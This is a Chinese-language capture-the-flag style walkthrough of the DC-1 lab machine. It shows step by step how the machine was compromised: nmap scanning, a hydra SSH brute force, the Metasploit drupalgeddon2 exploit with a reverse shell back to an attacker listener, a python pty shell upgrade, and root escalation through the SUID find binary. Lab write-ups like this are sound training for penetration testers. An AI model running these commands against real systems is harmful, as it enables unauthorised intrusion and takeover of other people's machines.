## 总结

getwebshell → 发现`CMS`→ `MSF`远程反弹`SHELL`

提 权 思 路 → 发现`SUID`-`FIND`→ `FIND`提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.167`

![](https://image.3001.net/images/20230727/1690447053_64c22ccd64e5c02995d4b.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.223.193`

![](https://image.3001.net/images/20230727/1690447054_64c22cce6d5c855833457.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.223.193
    

![](https://image.3001.net/images/20230727/1690447055_64c22ccf69352a70422a7.png!small)

    
    
    sudo nmap -sU --min-rate 10000 -p-  192.168.223.193
    

![](https://image.3001.net/images/20230727/1690447056_64c22cd06b86afe54c59b.png!small)  
通过两次收集到的端口:`→22,80,111,46232,53990`

### 目标端口对应服务探测

通常`udp`端口测不出啥，主要探测`tcp`

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,111,46232,53990 192.168.223.193
    

![](https://image.3001.net/images/20230727/1690447057_64c22cd146d83acc51596.png!small)

![](https://image.3001.net/images/20230727/1690447059_64c22cd3bc671661eeb51.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用(pass)

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
`22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) `

    
    
    # 进入msf OpenSSH 6.0p1
    msfconsole
    # 搜索对应脚本
    msf6 > searchsploit openssh 6.0p1
    

![](https://image.3001.net/images/20230727/1690447060_64c22cd4c95cbd97fbfb6.png!small)

#### 22-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ssh root<span class="label label-primary">@192.168.223.193</span> -p 22
    # 密码尝试
    password > root
    

说明支持密码登录，但是密码不对

![](https://image.3001.net/images/20230727/1690447061_64c22cd5b0e3be2310083.png!small)

#### 22-SSH弱口令爆破(爆破着玩)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.223.193 ssh -s 22
    

在等待结果的同时让我们尝试使用另外的信息收集

![](https://image.3001.net/images/20230727/1690447062_64c22cd6a43662a5bd951.png!small)

### 80-HTTP端口的信息收集

访问 http://192.168.223.193:80 发现是一个有名的`CMS`

![](https://image.3001.net/images/20230727/1690447063_64c22cd788cb3182d09d6.png!small)

#### 信息收集-网站指纹

    
    
    whatweb -v http://192.168.223.193:80
    

确认了`CMS`的版本信息 `Drupal 7`

![](https://image.3001.net/images/20230727/1690447064_64c22cd86d856f727aeec.png!small)

#### 漏洞利用-网站指纹

既然确定了版本，直接上工具

    
    
    msfconsole
    
    searchsploit Drupal 7
    

查看了一下

![](https://image.3001.net/images/20230727/1690447065_64c22cd991105109698c7.png!small)

### 其他端口的信息收集

不需要啦~

## 漏洞利用-getwebshell

觉得还是远程执行的`exp`比较好

    
    
    search Drupal 7
    >use exploit/unix/webapp/drupal_drupalgeddon2
    

选一个时间靠后并且`Rank`比较高的

![](https://image.3001.net/images/20230727/1690447067_64c22cdb14698b12676f0.png!small)

    
    
    # 感觉只要设置攻击机以及监听端口，还有目标机器
    show options
    

![](https://image.3001.net/images/20230727/1690447068_64c22cdc19be7e893f45c.png!small)

    
    
    # 设置个反弹shell
    show payloads
    set payload 3
    

![](https://image.3001.net/images/20230727/1690447069_64c22cdd6626fe07b906c.png!small)

    
    
    # 配置MSF
    set lhost 192.168.45.208
    set lport 5555
    set rhosts 	192.168.230.193
    set rport 80
    run
    

成功`getwebshell`

![](https://image.3001.net/images/20230727/1690447071_64c22cdf02d9a8e6cd651.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的`shell`交互不友好，使用`shell`先获取`shell`

    
    
    # 利用shell命令获取shell
    meterpreter > shell
    Process 4192 created.
    Channel 0 created.
    pwd
    /var/www
    whoami
    www-data
    # 利用python获取交互shell -> python失败使用python3
    python -c "import pty;pty.spawn('/bin/bash')";
    www-data<span class="label label-primary">@DC-1</span>:/var/www$ 
    

![](https://image.3001.net/images/20230727/1690447071_64c22cdfd4c18f81d02e2.png!small)

### FLAG1获取

    
    
    www-data<span class="label label-primary">@DC-1</span>:/var/www$ find / -name local.txt 2>/dev/null
    find / -name local.txt 2>/dev/null
    /home/local.txt
    www-data<span class="label label-primary">@DC-1</span>:/var/www$ cat /home/local.txt
    cat /home/local.txt
    ******************
    

![](https://image.3001.net/images/20230727/1690447072_64c22ce0a46eb4b70a3a3.png!small)

### 权限提升

#### Linux提权-sudo提权尝试(失败)

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

![](https://image.3001.net/images/20230727/1690447073_64c22ce16c170c975c287.png!small)

### Linux提权-suid提权尝试

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    

![](https://image.3001.net/images/20230727/1690447074_64c22ce22fa2e28a1570c.png!small)  
如果发现有东西的话 访问 https://gtfobins.github.io 寻找

![](https://image.3001.net/images/20230727/1690447075_64c22ce372abcbaa57b67.png!small)

    
    
    # 查找文件提权
    find . -exec '/bin/sh' \;
    

提权成功

![](https://image.3001.net/images/20230727/1690447076_64c22ce49c6cb6b3d846b.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    cat /root/proof.txt
    ****************
    

完结撒花~

